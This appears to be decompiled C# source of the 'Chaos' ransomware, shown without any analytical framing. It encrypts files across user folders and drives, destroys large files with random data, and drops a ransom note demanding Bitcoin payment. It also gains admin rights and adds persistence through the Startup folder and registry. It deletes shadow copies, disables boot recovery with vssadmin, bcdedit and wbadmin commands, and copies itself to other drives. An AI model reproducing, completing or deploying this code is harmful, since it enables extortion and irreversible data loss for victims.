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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>ynD7QZH4603HrpqOZBPfWEHXtUB6EZAtGmJagYBTn23tsM764s9IBTE6ujUCK1rZGsyhL07HCbU1WN9nc8X0fKyRnWp8Nwtc4xqecU+gueXwOorlUIOLjyHbosQ9Q2zRr622c/Uiue6dQTiY637mDVW5r64rRquskZsh4k1DNr0=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

